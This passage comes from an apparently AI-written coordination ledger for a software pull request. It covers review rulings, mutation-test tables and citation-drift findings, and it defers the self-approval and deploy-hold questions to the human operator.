at `95292ea4`, zero untracked files, and `git reset --hard HEAD` restored it exactly. But it also means
my first mutation-table run measured a worktree I had not intended to create, and was right by accident.
**I re-measured deliberately in a scratch worktree cut from `origin/main`** before believing any of it,
which is the only reason the table above is evidence rather than a coincidence.

---

## 2026-09-10 10:5x — CLOSE RULING, and the third invented rule of the day is also mine

The worker asked a real question: bring `ws/clear-meadow` to the merged commit by MERGING `origin/main`
into it (tip CONTAINS `24f32a18`, no force-push), or does the fingerprint want the tip to BE `24f32a18`?

**Ruled: merge, no force-push.** I read `fingerprint.ts` instead of quoting it. `verifyDone` does three
things to the tip — `claim.handoffCommit !== claim.branchTip` -> `no-handoff-commit` (:113-116); `branch`
= **the branch the LIVE REGISTRY names**, not `run.branch` (:87-90); `tip !== claim.branchTip` ->
`stale-tip` (:214). **Nothing in `fingerprint.ts` or `close.ts` names `main`, an ancestor test or
containment.** A merge commit satisfies the rule exactly as a reset would.

**So "must reach the merged commit or it reads `stale-tip`" was mine, and it was never true.** `CLAUDE.md`
says the fingerprint re-measures the workspace branch and that a separate FEATURE branch wedges the close
with `stale-tip` — both true. I added main-containment on top and then repeated it in this ledger twice,
in mail, and to the operator. **Third invented rule today**: the ugrep zero, the one-surface protection
read, the `_transcript_path` "defect" that the spec specifies — and now this. Every one is the same act:
paraphrasing a rule I could have read.

**What IS live, and neither of us had seen it.** After the tip passes, `verifyDone` runs
`ccd pr-state --session` against that same WORKSPACE branch and refuses on
`claim.prNumber !== measured.number`. `ws/clear-meadow` is bound to **#57, #59, #62, #67** — all merged.
This wave's PRs are on `fix/c1-rescue-lane` (#69) and `fix/c1-citation-sweep` (#78). So pr-state answers
**#67**, and a claim naming #78 is refused **`pr-regressed`**, not `stale-tip`. Told the worker to measure
`pr-state` and claim what it answers, or claim `prNumber: null` (the guard requires both sides non-null).

**And this wave is the exact shape `fingerprint.ts:215-222` warns about in its own comment** — *"a brief
that told the worker to commit on a separate feature branch instead of this workspace's own"*. Ours did,
twice, and I approved both. That is a COORDINATOR finding. It does not make #69 or #78 wrong — both were
right to be their own PRs — but the close pays for it, and the brief is mine.

---

## 2026-09-10 11:0x — #78 MERGED `29e634b3`. **Wave-done REFUSED on a measurement.** And the worker overruled me, correctly, twice

### #78 — verified on `main`, not on the branch

`29e634b3`. 7 files, **204 changed lines across `ccd/ccd` and `server/test`, ZERO of them non-comment**,
one marker. My classifier and the worker's agree. Before the merge I had verified 61/61 comment lines in
`ccd/ccd`, three sampled citations (`stranded` 0/0/12; `_auto_swap_check` does test `-eq 2`;
`_swap_target` has four non-zero returns), and the nine comment-scanning + touched suites at 402/402 —
those being the ONLY suites a comment-only diff can break.

### The wave-done is refused, and the run stays open

Run 35's fourteen items are Tasks 0, 0b and 1–12 of the wave-3 server plan. **Task 11 names exactly one
artifact** — one `describe` appended to `server/test/project-pools-read.test.ts`, importing `bootAgent`
and `connectToAgent` from `remoteHelpers.ts`. Measured on `ws/clear-meadow` at `d01e8f1e`, file-scoped:

    210 lines, 4 describes — 'never the server box' 0, 'bootAgent' 0, 'remoteHelpers' 0

The pin is unwritten, and `project-pools-read.test.ts` is not on `origin/main` either, so it did not ship
elsewhere. **The worker's own mail says the same twice** (*"Tasks 11 and 12 and D-2000 are still open"*);
the only sentence disagreeing is "Wave 4 is complete". Taking their measurement over their summary.

**Refusing costs nothing here, and that is why this is the right shape.** I simply do not call
`runs advance`: run 35 stays `dispatched`, items stay `pending`, the branch is untouched, and the same
fingerprint will verify later against a new tip. **Re-scoping the run ROW is what would be destructive** —
no update route, so it means abandon-and-reopen, and with run 34 `done` that retires the program.

**A methodological near-miss inside this call, worth more than the call.** My first check was
`git grep -F "never the server box"` across every ref — it "found" the string on ~70 refs and told me
nothing, because it was matching the PLAN, which quotes the test verbatim. **A search for a test's text
will always match the document that specifies it.** Only the file-scoped read is evidence.

### The worker overruled me twice today, and was right both times

1. **The catch-up merge.** I ruled "merge `origin/main` into `ws/clear-meadow` — do it", in the same mail
   in which I had just proved the fingerprint never looks at `main`. They measured what I had not: a
   trial merge gives **35 conflicted files**, none of them this wave's — `auth/gate.ts`, `server.ts`,
   `watch.ts`, `shared/api.ts`, `ccd/ccd` and 25 PWA test files. **Their refusal stands.** I issued a
   directive whose cost I had not measured, one sentence after proving it unnecessary.
2. **The ruleset**, this morning. Same shape: I asserted, they measured.

**The standing instruction I am giving them is to keep doing it**, and the reason belongs in this ledger:
a coordinator who is wrong three times in a day is only safe if the worker treats a ruling as a claim.

### Their finding, and it is the best operational one of the day

**A D-number is quotable only from the tree that defines it.** Citing my issued-but-unmerged `D-2381`
from their plan turned `deviation-refs.test.ts` RED — *"a tracked file names a global D-ref above the
ledger high-water D-2348 … expected 2398 to be 2431"*. The floor seed is the highest `D-` TOKEN anywhere
in this project's plans and specs and **a mere mention counts**, so quoting another branch's allocation
raises the floor off YOUR tree and burns the band between — however properly it was allocated. What
matters is which tree the token lands in first. They described the row without the number; I would have
cited it.

### The rule from my own near-miss, paired

Their mutation table said two suites were "120 at the head"; my `grep -cE '^\s*it\('` answered 108 and I
was one keystroke from filing it. I ran vitest instead: **120**, exact. `it.each` expands at runtime, so
a grep and a vitest count are not comparable instruments. **One count discrepancy with an unknown method
is a guess, not a finding — measure their method before doubting their number.** Third time between us
(the "65 files", the "68 / 1954"), three for three in their favour. It is the mirror of D-2340, *a
measurement quoted from a review is a claim*, and the pair belongs together.

### What is open

Tasks 11 and 12 of the wave-3 server plan, and D-2000 which may be why they stalled — the worker's call
whether they finish them or hand them on with a written reason. The ccd queue plan's Part D
(D-2347 + D-2376–D-2381) is written and waiting on the workspace spawn.

---

## 2026-09-10 14:3x — #81's gate: 13 raised / 11 survived / 2 refuted. **The worst finding is my own ruling.**

Four lenses on `opus`, one `sonnet` refuter per finding, 17 agents, in an isolated read-only worktree at
`59b8e586`. Lenses chosen for the class this tree has no guard for: **absence claims falsified by the
merge**, invariants minted by composing two sides, premises the merge invalidated, content lost.
Artifact: `pr81-coordinator-gate.md` in this session's scratchpad.

### IMPORTANT 1 — I ruled "`ccd/ccd` takes main's side WHOLESALE", and that ruling shipped a lie

The worker executed it exactly, and the code half was right: main carries #73's work, the branch does
not. **The prose half carried an absence claim this very merge falsifies.** `pr81:ccd/ccd:15669`:

> WHEN account-pools wave 3 lands its reader … measured: `git grep -c stranded server/src/registry.ts`
> **is 0 on `origin/main` and on this branch**; non-zero only on the wave-3 branch, where that reader lands

Measured on the three trees: **`origin/main` 0, `7ca2b97a` 12, `pr81` 12.** *This PR is the wave-3 branch
landing.* So the sentence is false on the merged tree, and "WHEN … lands" describes a future the commit
makes present.

**This is the identical class the worker caught in `ccd-crosspool.test.ts`, and my ruling re-introduced
it one file over, hours later, after I had read and adopted their memory about it.** Their rule —
*the side to distrust is whichever one claimed something about the other side's ABSENCE* — is the one I
failed to apply to my own instruction. **"Take main's side wholesale" is a rule about AGE. The defect is
not about age.** A side-choosing rule cannot see this class at all, because both sides' prose is
internally consistent; only the merged tree falsifies one of them. Six sites.

### The other three important findings

- **The swap composition minted TWO invariants and the worker pinned ONE.** Both new cases observe the
  ENQUEUE; neither drives a refusal, so **nothing reds if the refusals move back inside the queued
  callback**. Their D-2425 is right about what it pins; the second half has no mechanism.
- **`emitPools` is awaited I/O wearing `emitCoord`'s justification.** `watch.ts:780` is
  `await this.emitPools(...)` and its comment cites "`emitCoord`'s reason one line up". Read both:
  `private emitCoord(…): void` says *"touches no `node:sqlite` and no I/O"*; `private async emitPools(…)`
  opens with `await readProjectPools(this.deps.io, …)`. **The borrowed reason is the exact property the
  borrower lacks**, and it sits immediately before `detectDialogs`.
- **`registry.ts:929`'s "22 field reads" is 23** on the merged tree, so "~529" is 553; four more copies.
  **My reviewer over-claimed it as merge-created and the verifier corrected it** — the branch tip already
  carried it. `registry.test.ts` already asserts 23; only prose drifted. The refuter earning its place.

### #81 is CONFLICTING for the FOURTH time, and all four required checks are GREEN

`origin/main` is `e4393adc` — #76, #82, #83 landed past the second merge. `test-macos` went green too,
so **CI settled D-2409 with the arbiter**, exactly as the worker predicted. The third merge is the moment
to land all eleven findings.

### Two rulings the worker asked for

**D-2428** (`ccd/ccd:1846`'s stale "one function away") — leave it, and do it in ONE `ccd/ccd` pass with
IMPORTANT-1, agent-first. **The worker-skill sentence for D-2421** — its own PR: `worker-skill.test.ts`
pins twelve clauses VERBATIM, and dragging a pinned-text change into a 57-file merge conflicting for the
fourth time buys nothing. Two lines, faster alone.

### And a memory near-miss worth more than most of the above

This session resumed on a config root holding **zero** ccrc-pwa memory, and reconciling the six roots
found `graphify-compaction-card-design.md` in two versions where **neither was a superset**: the newer
rewrite had silently dropped six measured facts the older copy explicitly flagged as *"NOT derivable from
the tree"* — the uncapped PreCompact stdout, the 10,000-char `additionalContext` spill, the hook ordering,
`readFileState`. Merged them back rather than taking the newer copy. **"Newest wins" would have destroyed
measured work — the same shape as IMPORTANT 1, in a different medium, on the same afternoon.**

## 21:3x UTC — #81 round three (`c8f8c93a`): the bound shipped, the mechanism did not

The worker closed D-2464 at `be44395b`, then D-2465..D-2468 at `c8f8c93a` — a shared one-second
deadline over the `pools/` listing and now-concurrent marker reads, plus consumer-owned `timeoutMs`
threaded through `FleetIO` to the remote client, plus three prose classes. Four required checks and
the PWA build were green at `be44395b`; `c8f8c93a`'s run is still settling.

I gated it with four independent lenses (deadline runtime, mutation adequacy, claim truth, blast
radius), each finding refuted by a separate adversary. **22 raised, 20 survived — and 20 is not the
answer.** They cluster into eight decisions, allocator-issued as D-2476..D-2483 and mailed as 506.
Two refuters contradicted each other outright; I resolved both by measurement rather than by vote.

### The two that matter most, and they are the same failure twice

**D-2476 — the round's own new property has no mechanism.** Keep the shared deadline and restore the
serial loop: `demo` resolves at once, `quiet-basin`'s race settles null when the shared deadline
fires, and `acct-a-demo` then settles null *immediately* because that deadline has already resolved.
Same launch order, same four verdicts, ~1 s elapsed, inside the case's own 2500 ms watchdog. **Green.**
So the concurrency this round exists to introduce is pinned by nothing — while `watch.ts`'s new
comment says the test file "pins the cost arms, concurrency and deadline". A comment is a request.
The deadline IS pinned; only the concurrency is not, and only one of the four marker arms actually
depends on the race at all.

**D-2480 — the class search stopped at the files the review named.** D-2466 and D-2467 exist to close
exactly that habit, and it repeated one file over in the same commit: `shared/roster.ts` still says
*"One more importer is coming: the project-pool route (wave 3) will validate a request body against
this object"* — that route ships in this PR — and `server/src/poolrule.ts` still says *"both this
module and the PWA consume it"* when measured, **nothing under `pwa/src` imports `poolrule` at all**.
That second one is D-2467's phantom-renderer defect in a neighbouring file, written by the same hand
in the same round that corrected it. `correcting-the-instance-is-not-correcting-the-claim`, again.

### The design finding I had before the reviewers did, and they sharpened

**D-2478.** The budget is justified in its own docstring by the watcher's 2 s cadence, but
`readProjectPools` has six callers and **five are HTTP routes with no cadence at all**. On a
slow-but-CONNECTED fleet every marker loses the shared race together, so `poolUndecidable` is true
for every project: 503 `pool-unreadable` on every create and every ordinary swap, `unmeasurable`
placement on every project row, and a 200 carrying `state:'unreadable'` from the tag route
*immediately after a ccd write that succeeded* — with nothing logging the episode. Before this round
those callers waited and answered correctly. The remedy is the mechanism this same commit added and
documented as exactly that: make the budget a parameter and let each consumer own it.

**D-2479 is the honest limit on all of it.** On the stalled-agent tick the constant is written for,
the same tick already awaits `readRegistryMeasured` — a serial `for (const id of ids) await
buildRecord(...)`, roughly N_sessions × 15 s — *before* `emitPools` is reached. Bounding the
smallest, already-concurrent leg cannot restore a cadence that is already gone by two orders of
magnitude. I ruled explicitly against widening this wave to fix that: it predates the PR and is
main's shape. Correct the justification, disclose the dominant read, do not chase it here.

### The merge gate is not a review question any more

Measured, not taken on report: the identity `gh` is authenticated as on this box is the same account
that authored PR #81 — one GitHub login serves the whole fleet. GitHub will not
accept a self-approval, so **ruleset 22520257's one approving review cannot be satisfied by any
session on this fleet.** The identity holds `admin: true`, so the bypass exists — capability, not
authorization. Two peer sessions independently reached the same conclusion and declined to approve.
`bright-meadow` also cleared the sequencing question against PR #75 (`660d576d`): conflict-free
either way, #75's only `server/src/server.ts` hunk being `runId: null` on the ask-answer feed event.
So #81 is blocked on an operator decision, not on anything the worker or I can measure.

## 05:4x UTC — #81 rounds four and five: the gate is converging, and one class is not

Two more rounds since `c8f8c93a`. Both fixed what the previous gate found and both introduced
something new, which is the ordinary shape of this work — what matters is the trend.

| head | raised | survived | worst |
|---|---|---|---|
| `c8f8c93a` | 22 | 20 | 4 blockers |
| `c833746b` | 26 | 22 | 1 blocker |
| `9736a70e` | 13 | 11 | 2 important |

The drop at the last head is partly mine: I gave the reviewers explicit severity calibration
("blocker = I would refuse the merge") and told them **"no findings" is an acceptable answer**. Two
gates of 20+ survivors with a long minor tail was my instrument being loose, not the tree being bad.

### The finding I caused

Round four's D-2478 remedy — mine — said the routes should pass "a bound appropriate to a request
**(or none)**". The worker implemented `null` exactly as written, and `null` turned out to mean *no
bound whatsoever*: `localIO` takes no `timeoutMs` parameter at all, `index.ts` wires it directly in
the default single-box mode, and `Fastify({ logger: false })` sets no `requestTimeout`. A FIFO under
`$REG/pools/` would have hung a route forever — worse than the 1 s constant I had objected to.
Recorded as D-2484 with the error attributed where it belongs. Round five closed it properly:
`budgetMs` is a required `number`, `null` is unrepresentable, and the route's own root listing moved
inside the deadline.

### What I measured rather than argued, across both rounds

- Re-serialize the marker reads at `c833746b`: **RED**. D-2476 closed. (It was 23/23 green before.)
- Delete both `timeoutMs` arguments at `c833746b`: **RED**. D-2477 closed. (85/85 green before.)
- Raise the route budget to a day at `9736a70e`: **4 tests RED** across three route suites, on fake
  timers. D-2485 closed.
- Delete `controller.abort()` from the deadline timer at `9736a70e`: **39/39 GREEN**, including the
  case named *"aborts losing reads when the shared deadline expires"*. D-2492 — the round's own new
  guard, unpinned, because the assertion reads the flag after `close()` aborts the same controller.
- An aborted local read throws `ABORT_ERR`, and `failureFor` maps only `ENOENT` to `absent`, so
  cancellation reads `unreadable`. The fail-shut direction. No overloaded null at that seam.

I also caught myself: I sent D-2481 with a remedy ("pin the ordinary arm's enqueue too") that was
wrong, because both swap arms converge on ONE `queue.run`. Measured: an ordinary-arm bypass is green
in the file the comment cited and **red in `lifecycle.test.ts`**. Corrected to documentation-only and
told the worker explicitly *not* to add the redundant test I had just asked for.

### The one thing that is not converging

The stale-rollout claim class has now appeared **four times in one PR** — D-2466, D-2467, D-2480,
D-2490 — and D-2490 asserted a "semantic sweep across `shared/`" that `shared/generate.mjs`
falsifies. Every correction has searched the files a review named rather than the class. So for
D-2497 I asked for something different: **report the method, not the result.** Four recurrences is a
process defect, and handing over a fifth list of instances would only buy a fifth recurrence.

### Gate state

Full CI green at `9736a70e` — all five legs, `test-macos` 33 minutes. This PR is failing MY gate, not
GitHub's, and has been for three heads. The merge itself remains blocked on the approver question
that only the operator can answer: the one GitHub login on this fleet authored the PR.

## PR #81, round six — `d978afc6`: the code is right, the prose still is not

The worker published `d978afc6` closing D-2491..D-2497. One functional change reached `server/src`:
the creation route folds `body.crossPool !== true` into its `needsPools` predicate. Everything else
in `src/` and `shared/` is comment text; the rest is tests and plan entries.

### Ten mutations, ten red

I ran every guard this round claims, alone, on an isolated `git archive` export. Baseline 118/118.

| mutation | result |
|---|---|
| drop `body.crossPool !== true &&` (D-2491) | RED |
| delete `controller.abort()` from the deadline timer (D-2492) | RED — **green at `9736a70e`** |
| bare `completedRoot`, no late-root normalization (D-2494) | RED across 3 suites |
| drop `clearTimeout` on the abort path (D-2495) | RED |
| delete the pre-aborted early guard (D-2495) | RED |
| make `dispose` a no-op (D-2495) | RED |
| stop forwarding `signal` into the local read (D-2496) | RED |
| predicate → `() => false` | RED, 2 tests |
| predicate → `() => true` | RED, 2 tests |
| predicate → `() => body.crossPool !== true` | RED |

The last three are the ones worth keeping. A pin that reds on the exact clause proves only that the
test and the code were written together; mutating the predicate in all four directions is what shows
each clause is independently held rather than merely correlated.

### Seven findings — D-2498..D-2504, none a blocker

Four lenses (opus) over the round, each finding refuted by two sonnet skeptics: 11 raised, 11
survived. **A 100% survival rate is an instrument reading, not a result** — my refuters refuted
nothing, which is the opposite miscalibration to the one I corrected last round. So I verified every
load-bearing claim myself, deduplicated three clusters down to one finding each, and corrected one
reviewer's sentence that my own measurement falsified.

- **D-2498** — the round moved `readdir` from `io.ts:103` to `:105` with a docstring edit, and left
  six citations at 103. Line 103 now holds `readFileB64Measured`, the exact counterexample to the
  sentence pointing at it. The round also re-measured D-1680 from `:100` to `:103` **against the
  pre-edit file**, so D-2489 and D-2497 both assert a number the commit carrying them invalidated.
  D-2483 had already named this class. Remedy is the tree's own precedent, not my invention:
  `ccd/ccd:1365` abandoned line numbers for a grep and says why.
- **D-2499** — `shared/roster.ts`'s new `HUES` rationale names test consumers that do not exist; the
  sole importer is `pwa/src/lib/offline.ts:10`. The sentence it replaced was true and had just gone
  live — it warned against "a second copy" of the order, and `ccd/ccrc-adopt:103` is now exactly
  that, unpinned.
- **D-2500** — `shared/generate.mjs:131` claims one consumer for `CCRC_MEASURED`;
  `ccd/ccd-telemetry-keepalive:640` refuses to run without it.
- **D-2501** — `ccd/ccd:1045` still says `ccrc install` is a verb "once that verb lands". It landed.
- **D-2502** — `shared/api.ts:5903` says the ccd scan "asserts it in both directions". It asserts
  one; the test's own title says so. Inherited, but the round rewrote that sentence.
- **D-2503** — D-2495 pinned `dispose` on the one path where `{ once: true }` makes it a no-op, and
  left it unpinned on the two where it prevents a listener leak. Measured across all eight
  remote-client suites: abort-path removal RED, timeout-path removal GREEN, resolve/reject removal
  GREEN, **control** (neuter `resolve`) RED at 26 failures across 5 files. Without that control the
  two greens would have been ambiguous.
- **D-2504** — the class, ruled rather than swept again.

### The class, fifth appearance — and why I stopped asking

D-2497 did what I asked: it published the method. The method is the defect, and now in a way I can
name precisely instead of counting recurrences.

**Corpus.** The sweep covered `shared/**`, `server/src/**` and the plan. D-2500 and D-2501 live in
`ccd/`, which is shipped, agent-first, and full of this program's rollout prose.

**Query class.** The sweep paired pool terms with a nine-verb list. D-2500 is a false *consumer
census* in the present tense — "their one consumer is X" — with no rollout verb and no pool term in
it. No query of that shape can reach it.

So the class was never "staged pool prose". It is **a sentence asserting who consumes something, or
when something lands, that the tree has since falsified** — and that is what I recorded, with an
explicit instruction not to enumerate it a fourth time. Asking a worker to search harder for a class
you have defined too narrowly buys another recurrence, which is what the previous three rounds bought.

### Gate state

CI at `d978afc6`: agent, pwa and build-pwa green; server and macos still running when the gate
closed. The code in this PR is correct and, for the first time, every guard it claims is pinned —
what is failing my gate is text. The merge remains blocked on the approver question that only the
operator can answer.

## PR #81, round seven — `e0a0c4cd`: the code is finished; the ledger is what keeps moving

Six of the seven round-six corrections verified closed by measurement, six earlier pins re-checked
and still red, no regressions. Then seven more findings, D-2509..D-2515 — and **not one of them
touches the code**. That is the shape of this round and the reason to write it down.

### What closed, measured rather than reported

`FleetIO.readdir` really is at `io.ts:105` and the two shipped citations now name the symbol.
`pwa/src/lib/offline.ts:10` is `HUES`'s only importer and `ccd/ccrc-adopt:103` is the second copy the
new sentence names. `ccd/ccd-telemetry-keepalive:640` is the second `CCRC_MEASURED` consumer;
`ccd/ccrc:5349` defines `_inst_accounts_sh`; `ccd/ccd`'s provenance marker re-stamps as
`ccrc-unmodified`. D-2502's new reverse assertion is real **and isolated** — orphaning `session-live`
reds on `declared journal-only tokens with no ccd producer` specifically, with the unknown-token
control reding on the old direction. D-2503's two new tests both bite.

### I was half wrong, and the wrong half was the inference

D-2503 told the worker the `resolve`/`reject` `dispose()` wrappers were load-bearing. They were
duplicates — `entry.dispose()` at `onMessage:292` and `rejectAllPending:410` already covered those
paths, which I had not read. I measured a green mutation and inferred *load-bearing and unpinned*
from *unpinned*. Deleting them, as the worker did, was the better reading than the test I asked for.

That is the same error I have been charging the worker with for six rounds: a measurement taken
correctly, an inference reaching past it. It belongs in the ledger under my name, not folded into the
next round's findings.

### Three citation drifts in one PR — the convention is the defect

D-2483 named it. D-2498 named it again and prescribed "apply every hunk before measuring". Then this
round landed `+1` in `shared/generate.mjs` and `+2` in `shared/roster.ts`, swept only the
`FleetIO.readdir` family, and silently falsified seven citations across four **other** programs'
plans — `telemetry-keepalive.md:72` now points at `homeAbleIds` and `CCRC_HOME_ABLE=` instead of the
telemetry derivation and its emit, which is the dangerous shape because both read plausibly.

And both new disclosures inverted the number they disclose: D-2489 and D-2497 attach "did not
describe the published tree" to `:105`, which **is** the published value, leaving `:103` — the number
that actually went stale — unnamed. Traced from git: `c833746b` :99 → `9736a70e` :103 (correct at its
own commit) → `d978afc6` :105 with the plan still saying :103. So D-2489's measurement was right for
the tree it shipped in and was falsified by the *next* commit; only D-2497's was same-commit.

So D-2511 stops asking for numbers to be re-measured a fourth time and adopts the ruling this tree
already made at `ccd/ccd:1365` — *"stated as a GREP rather than as line numbers — the numbers this
sentence first carried were wrong the day they were written, and would have gone wrong anyway."*
That correction is against my own D-2498, which told the worker to re-measure when it should have
told them to stop writing.

### Two guards the round left singly-held

- **`{ once: true }`** (`client.ts:204`) became the *sole* abort-path listener release when
  `entry.dispose()` came out of `abort()`. Delete the option and all 8157 server tests stay green.
  The one red I saw was `boot.test.ts`'s 3000 ms boot-timing assertion — a load flake from my own
  concurrent run; isolated it passes 3/3 with the mutation and 3/3 without.
- **`rejectAllPending`'s `entry.dispose()`** is new in this PR and ships with no mechanism, because
  the function has none: gutting its entire body — dispose *and* reject — produces zero new failures
  across the whole suite.

Both greens needed a control before they were findings. The first needed the flake excluded; the
second needed the whole-body gut, because the single-line green proved nothing on its own.

### Where this actually stands

Round six: seven findings. Round seven: seven findings. The count is not falling — but the
**character** has changed completely. For two heads now the code has been correct and every guard it
claims has been pinned; all fourteen findings since have been ledger accuracy, citation hygiene, and
which call site a test sits on. What is iterating is documentation discipline, and each round's
corrections have introduced fresh documentation errors of the same class.

That is a real decision point, not a gate result, and it is the operator's: keep gating prose to
convergence, or merge a PR whose code has been finished for two rounds and carry the remaining
ledger corrections as follow-up. I am not going to decide it by continuing to send rounds.

### Amendment, same morning — I passed on five citations I had not measured

D-2510 named seven drifted citations. I had measured two; the other five came from a reviewer and I
relayed them. Content-verifying all six sites afterwards found two errors of my own:

- One citation I listed does not exist — I relayed a `:159-160` that is in no plan.
- `account-health-probe.md:106` cites `roster.ts:88` for `telemetry`, and my "this round's +2 hunk"
  explanation is wrong for it. Measured across the PR: telemetry sat at `:88` at both `c833746b` and
  `9736a70e`, so that citation was **correct until this PR touched it**; `d978afc6`'s roster.ts hunk
  was net **−1** and moved it to `:87`; `e0a0c4cd`'s was **+2** and moved it to `:89`. Two commits,
  opposite directions. Applying `+2` to `:88` yields `:90` — a fresh wrong number.

That is the hazard the repo already knows about, stated in project memory as *verify every corrected
citation by CONTENT, never by arithmetic* — and I reproduced it while writing the finding that names
it. Sent as an amendment with all six current values measured by content, plus anchor quotes.

The general rule this keeps proving: **relaying a reviewer's measurement makes it my claim.** A gate
that verifies its own load-bearing findings and relays the rest has not raised its evidence standard,
it has only moved where the unverified claims enter.

## PR #81, round eight — `b6b7fb4a`: clean, and the recurring class finally closes

All seven round-seven corrections verified closed **by my own measurement, none relayed**. Five
mutations, five red; full server suite matches the sandbox baseline exactly (8004 passed, the same
nine no-`.git` files failing); `ccd/ccd`'s provenance marker verifies `ccrc-unmodified`.

| pin | mutation | result |
|---|---|---|
| D-2514 `{ once: true }` | delete the option | RED |
| D-2515 `rejectAllPending` | gut the whole body | RED |
| D-2515, precisely | remove **only** `entry.dispose()` there | RED |
| D-2512 reverse scan | orphan a declared token | RED |
| regression | `dispose()` off the timeout callback | RED |

The third row is the one that matters. Last round the same call site went green and I could not tell
whether the guard was unpinned or the function simply unreachable; only gutting the entire body
settled it. Now the narrow mutation reds on its own, which is what a pin is supposed to do.

### The class closed, and I checked it mechanically rather than believing it

D-2511 told the worker to stop writing positional citations and cite symbols instead. They did, and
every new symbol resolves: `ExecSpec` at `roster.ts:66`, `AccountDef.telemetry` at `:89`,
`generateAccountsSh` at `generate.mjs:200` with `measuredIds` inside it at `:203`, and the
`CCRC_MEASURED` contract comment at `:160` really does state the `telemetry === 'anthropic'` rule.

Then the check that actually matters, because three rounds running the *correction* introduced fresh
drift: **did this round move anything anyone cites?** Measured, not assumed —
`shared/api.ts`'s hunk is at `:5901` and the highest citation into that file anywhere in the repo is
`:5615`; `remote-connect.test.ts` gained 47 lines but its three cited lines (29, 31, 37) are
byte-identical across the two heads; nothing cites the four other plan files by line at all.

**Zero drift. First round in this PR to introduce none.**

### The replacement sentence, executed rather than read

D-2513 replaced "Adding a tenth token is a two-line edit" with a claim that adding one is a
coordinated edit to the `ccd` emission, the union, `LC_REFUSAL_WORD`, and the test inventory. Reading
that would not tell me whether it is true, so I performed exactly the edit it describes — all four
parts — and ran the full suite. One new failure, and it was `ownership.test.ts` telling me I had
edited `ccd/ccd` without re-stamping its provenance marker: my own artifact, not a fifth surface.
The sentence is true.

### Asking the right question

Every gate so far has been asked *what is wrong with this round*, and a gate asked that finds things.
Rounds six and seven each returned seven findings, and not one of the fourteen touched the code. So
this time I ran a different instrument — three independent judges on the only question actually open:
**is this ready to merge, what breaks if it does, and which of the remaining prose imperfections
would genuinely mislead a maintainer versus merely being imperfect?** A reviewer that can never
conclude "this is done" is not a useful reviewer, and I told them so explicitly.

### The merge-readiness panel — 3/3 MERGE, zero blockers

Three independent opus judges, each asked the question that was actually open and each told plainly
that "MERGE" was an acceptable answer. All three mutated the code themselves rather than trusting the
seven prior rounds: one deleted the `read.reason === 'absent'` arm and got 11 RED across 3 files; one
flattened the stranded marker's `unreadable` to `null` and got RED in two suites; one measured the
deadline race resolving at its budget (a planted FIFO with a 1200 ms budget returned at 1215 ms).

**Verdict: 3/3 MERGE, no blockers.** Two of their findings I re-measured myself before believing.

**D-2516 — a dangling symlink at `$REG/pools/<project>` diverges.** Server: `readFile` throws
`ENOENT`, `failureFor` maps it to `absent`, `pools.ts`'s `continue` skips it, `poolFor` answers
`untagged` — constraint **lifted**. ccd: `[[ ! -e "$f" && -L "$f" ]] && { echo unreadable; }` —
refuses. The link *file* exists and only its target is absent, so `ENOENT` is genuinely ambiguous
here, and `readFile` cannot separate the two because it follows symlinks. The narrowing is not one
this code performs; it is one the Node API hands it already folded.

Not a blocker: ccd re-measures and is the authority, so nothing runs in the wrong pool, and it is
reachable only by hand from fleet-box shell. It earns an entry because of the company it keeps —
`ccd/ccd:15892` says of the still-open D-2000, *"an UNREADABLE `.project` reads as 'this project is
in no pool' and silently lifts the pool constraint for that row. Same class, different field."* This
is that class with a server-side instance, and the server already mirrors ccd deliberately elsewhere
(the 64-byte cap, the whitespace strip), so skipping the `-e`/`-L` pairing is an inconsistency in a
place this program has been careful.

**D-2517 — D-2000 has no mechanism.** Measured: no `deploy.sh` gate, no test, nothing in `server/src`
or `deploy/`. Its only non-plan mention, `ccd/ccd:15892`, is about a different defect entirely. The
plan says "D-2000 still forbids deploying this wave" in three places, and what that names is a
convention the coordinator and worker honour — the same shape CLAUDE.md already describes for the
HTTP chokepoint, *"a contract the coordinator skill honors, not an OS wall."*

That matters at the merge boundary specifically, and nobody raised it in eight rounds of asking
what was wrong with each round. Merging does not deploy. But it moves this code onto `main`, where
the next routine deploy — run by any of the nine other supervised ccrc-pwa sessions, for an entirely
unrelated reason — would carry it. The gate holding wave 3 off the live server is two sessions
remembering, not a mechanism. **That is the operator's to weigh before the merge, not after.**

### What eight rounds actually produced

Rounds four and five found real code defects and a blocker. Rounds six, seven and eight found
twenty-three findings of which **none touched the code**. The instrument that finally said something
new was the one that asked a different question — a defect hunt returns defects for as long as you
run it, and the thing I most needed to know was not on that list.

### `18041996` — the disclosure landed, and the class recurred one last time

The `io.ts` disclosure is accurate: it names the divergence, the API-side lift, ccd's fail-shut
authority, and why no `lstat` ladder was built. All three D-2000 statements now identify a convention
rather than a gate, D-2517 is recorded at `plan:4446`, focused suites 128/128.

And the `+3` comment lines that carried that disclosure sit at `@@ -11,17 +11,20 @@` — above the
`FleetIO` member list. `readdir` moved `:105` → `:108`. **Fourth consecutive round in which an
`io.ts` edit falsified a positional citation.**

I checked every positional `io.ts` citation in the tree and then filtered to the ones *this* commit
invalidated, holding to D-2511's own instruction not to sweep the repo's other ~85:

- **`plan:4159` — broken.** Present tense, *"`readdir` is at `server/src/io.ts:105`"*. One line.
- `plan:546`, `project-pools-read.test.ts:68` — cite `remote/io.ts`, a different file. Unaffected.
- `plan:4233 / :4307 / :4333` — cite `:103`/`:105` as the *history* of past commits. Still true.
- `mirrorplan.test.ts:33` — cites `io.ts:101-102` for `readFileFrom`'s clamp, but those lines were
  already the `readFileB64Measured` docstring at `b6b7fb4a`. Stale before this PR touched it; out of
  scope by my own ruling, and left alone.

Six broken last time, one now, and the survivor is **inside D-2483 — the entry that first named this
class.** The symbol conversions D-2511 asked for all held; the only casualty is the one citation
nobody converted. That is the ruling proving itself rather than failing.

### Closing position on this PR

| round | findings | touched code |
|---|---|---|
| four, five | defects incl. a blocker | yes |
| six | 7 | no |
| seven | 7 | no |
| eight | 2, neither blocking | no |
| nine | 1, one line | no |

Three independent judges, each mutating the code themselves, returned **3/3 MERGE with zero
blockers**. The code has been correct and fully pinned for four heads. What kept iterating was
documentation discipline, and it has now converged: one line outstanding, not blocking.

The two things that remain are not mine to settle. The approving review has no lawful satisfier on
this fleet. And D-2517 — the discovery that D-2000 is a convention two sessions honour rather than a
mechanism — means merging moves this code where the next routine deploy by any of nine other
sessions would carry it. Both are the operator's, and I have stopped sending rounds.

### `1e98dc16` — the class is closed, measured rather than declared

D-2483's last present-tense citation is now the `FleetIO.readdir` symbol, and `pools.ts`'s broad
